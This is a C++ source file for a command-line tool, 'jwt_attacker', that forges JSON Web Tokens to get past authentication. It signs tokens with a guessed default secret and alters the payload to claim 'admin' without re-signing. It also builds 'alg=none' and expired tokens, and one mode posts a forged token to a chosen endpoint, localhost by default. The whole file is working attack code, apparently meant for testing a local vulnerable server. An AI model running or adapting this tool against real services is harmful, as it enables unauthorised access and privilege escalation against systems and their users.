// jwt_attacker.cpp
// Compile: g++ jwt_attacker.cpp -o jwt_attacker -lcurl -lcrypto -std=c++17
// Requires: libcurl, libssl-dev, nlohmann/json.hpp (single header)

#include <iostream>
#include <string>
#include <ctime>
#include <vector>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include <cstring>

#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <openssl/buffer.h>

#include <curl/curl.h>
#include "json.hpp" // nlohmann::json single header

using json = nlohmann::json;
using namespace std;

static string base64UrlEncode(const string &in) {
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO *bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_write(b64, in.data(), (int)in.size());
    BIO_flush(b64);
    BUF_MEM *bptr;
    BIO_get_mem_ptr(b64, &bptr);
    string out(bptr->data, bptr->length);
    BIO_free_all(b64);
    // url-safe
    replace(out.begin(), out.end(), '+', '-');
    replace(out.begin(), out.end(), '/', '_');
    // strip padding
    while(!out.empty() && out.back() == '=') out.pop_back();
    return out;
}

static string base64UrlDecode(const string &in) {
    string b = in;
    replace(b.begin(), b.end(), '-', '+');
    replace(b.begin(), b.end(), '_', '/');
    while (b.size() % 4) b += '=';
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO *bmem = BIO_new_mem_buf(b.data(), (int)b.size());
    bmem = BIO_push(b64, bmem);
    vector<char> out(b.size());
    int len = BIO_read(bmem, out.data(), (int)out.size());
    BIO_free_all(bmem);
    if (len <= 0) return "";
    return string(out.data(), len);
}

static string hmacSha256(const string &data, const string &key) {
    unsigned char result[EVP_MAX_MD_SIZE];
    unsigned int len = 0;
    HMAC(EVP_sha256(), (const unsigned char*)key.data(), (int)key.size(),
         (const unsigned char*)data.data(), (int)data.size(), result, &len);
    return string((char*)result, (size_t)len);
}

static string make_jwt_hs256(const json &header, const json &payload, const string &secret) {
    string header_s = header.dump();
    string payload_s = payload.dump();
    string header_b64 = base64UrlEncode(header_s);
    string payload_b64 = base64UrlEncode(payload_s);
    string data = header_b64 + "." + payload_b64;
    string sig_raw = hmacSha256(data, secret);
    string sig_b64 = base64UrlEncode(sig_raw);
    return data + "." + sig_b64;
}

static string make_jwt_alg_none(const json &header, const json &payload) {
    string header_s = header.dump();
    string payload_s = payload.dump();
    string header_b64 = base64UrlEncode(header_s);
    string payload_b64 = base64UrlEncode(payload_s);
    return header_b64 + "." + payload_b64 + ".";
}

static size_t cb_write(void* contents, size_t size, size_t nmemb, void* userp) {
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

static string post_token_to_endpoint(const string &url, const string &token) {
    CURL *curl = curl_easy_init();
    if(!curl) return "curl init fail";
    string resp;
    struct curl_slist *headers = NULL;
    string auth = string("Authorization: Bearer ") + token;
    headers = curl_slist_append(headers, auth.c_str());
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "{}");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, cb_write);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
    CURLcode res = curl_easy_perform(curl);
    if(res != CURLE_OK) {
        string err = curl_easy_strerror(res);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return string("curl error: ") + err;
    }
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return resp;
}

int main(int argc, char* argv[]) {
    // usage:
    // ./jwt_attacker <mode> [secret] [endpoint]
    // modes: gen_fallback  gen_tampered  gen_alg_none  gen_expired  send_to_server
    // example: ./jwt_attacker gen_fallback default_fallback_secret
    string mode = (argc > 1) ? argv[1] : "help";
    string secret = (argc > 2) ? argv[2] : "default_fallback_secret";
    string endpoint = (argc > 3) ? argv[3] : "http://127.0.0.1:5000/protected";

    // common header
    json header = { {"alg","HS256"}, {"typ","JWT"} };

    // now
    time_t now = time(nullptr);

    if(mode == "help") {
        cout << "Usage: ./jwt_attacker <mode> [secret] [endpoint]\n";
        cout << "modes:\n";
        cout << "  gen_fallback    -> generate signed JWT with secret\n";
        cout << "  gen_tampered    -> generate signed JWT then tamper payload (no resign)\n";
        cout << "  gen_alg_none    -> generate alg=none token\n";
        cout << "  gen_expired     -> generate signed but expired token\n";
        cout << "  send_to_server  -> generate signed token (secret) and POST to endpoint\n";
        cout << "Examples:\n  ./jwt_attacker gen_fallback default_fallback_secret\n  ./jwt_attacker gen_tampered default_fallback_secret\n  ./jwt_attacker send_to_server default_fallback_secret http://127.0.0.1:5000/protected\n";
        return 0;
    }

    if(mode == "gen_fallback") {
        json payload = { {"userId", "attacker"}, {"exp", (long long)(now + 3600)} };
        string jwt = make_jwt_hs256(header, payload, secret);
        cout << "[+] Signed JWT (secret=" << secret << "):\n" << jwt << endl;
        return 0;
    }

    if(mode == "gen_tampered") {
        // generate signed token then tamper payload without resign
        json payload = { {"userId", "victim"}, {"exp", (long long)(now + 3600)} };
        string jwt = make_jwt_hs256(header, payload, secret);
        cout << "[*] Original JWT: " << jwt << endl;

        // split
        size_t p1 = jwt.find('.');
        size_t p2 = jwt.find('.', p1+1);
        if(p1==string::npos || p2==string::npos) { cout<<"bad token format\n"; return 1; }
        string header_b64 = jwt.substr(0,p1);
        string payload_b64 = jwt.substr(p1+1, p2-p1-1);
        string sig_b64 = jwt.substr(p2+1);

        // tamper payload -> change userId to "admin"
        json tampered_payload = { {"userId","admin"}, {"exp", (long long)(now + 3600)} };
        string tampered_b64 = base64UrlEncode(tampered_payload.dump());
        string tampered_jwt = header_b64 + "." + tampered_b64 + "." + sig_b64;
        cout << "[!] Tampered JWT (not resigned):\n" << tampered_jwt << endl;
        return 0;
    }

    if(mode == "gen_alg_none") {
        json hdr = { {"alg","none"}, {"typ","JWT"} };
        json payload = { {"userId","admin"}, {"exp", (long long)(now + 3600)} };
        string tok = make_jwt_alg_none(hdr, payload);
        cout << "[!] alg=none token:\n" << tok << endl;
        return 0;
    }

    if(mode == "gen_expired") {
        json payload = { {"userId","attacker"}, {"exp", (long long)(now - 3600)} };
        string jwt = make_jwt_hs256(header, payload, secret);
        cout << "[!] Expired token:\n" << jwt << endl;
        return 0;
    }

    if(mode == "send_to_server") {
        json payload = { {"userId","attacker"}, {"exp", (long long)(now + 3600)} };
        string jwt = make_jwt_hs256(header, payload, secret);
        cout << "[*] Sending token to " << endpoint << "\n";
        cout << jwt << "\n";
        string resp = post_token_to_endpoint(endpoint, jwt);
        cout << "[server response] " << resp << endl;
        return 0;
    }

    cout << "Unknown mode: " << mode << "\n";
    return 0;
}
